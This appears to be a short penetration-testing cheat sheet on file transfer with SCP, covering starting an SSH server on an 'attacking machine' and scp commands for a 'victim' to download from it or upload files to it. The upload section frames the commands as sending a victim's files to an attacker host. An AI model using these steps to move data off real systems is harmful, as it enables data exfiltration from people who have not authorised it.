- SCP is a command-line utility to copy files use SSH.

---

## Setting up Attacking machine

```bash
# Enabling SSH Server
 sudo systemctl enable ssh
 
 # Starting SSH Server
sudo systemctl start ssh

# Check for SSH Listening port
netstat -lnpt 
```

---
## Victim Download file from Attacker machine

```bash
# We specify the credential and its filepath and the output would be its current dir
scp user@TARGET:/path/to/file .
```

---

## Victim Upload file to Attacker machine

```bash
# file is the file name we want to sent to attacker
# /path/ is the path where it land
scp file user@TARGET:/path/
```

